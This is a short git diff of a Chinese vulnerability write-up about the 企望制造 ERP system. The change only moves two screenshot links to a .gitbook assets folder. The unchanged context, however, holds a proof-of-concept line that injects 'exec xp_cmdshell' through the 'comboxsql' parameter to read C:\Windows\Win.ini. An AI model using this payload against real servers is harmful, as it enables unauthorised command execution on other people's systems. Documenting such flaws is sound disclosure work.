@@ -18,7 +18,7 @@ title="企望制造ERP系统"
 
 登陆页面
 
-![image-20230828150159555](images/image-20230828150159555.png)
+![image-20230828150159555](../.gitbook/assets/image-20230828150159555.png)
 
 验证POC
 
@@ -30,4 +30,4 @@ Host:
 comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'
 ```
 
-![image-20230828150215433](images/image-20230828150215433.png)
+![image-20230828150215433](../.gitbook/assets/image-20230828150215433.png)
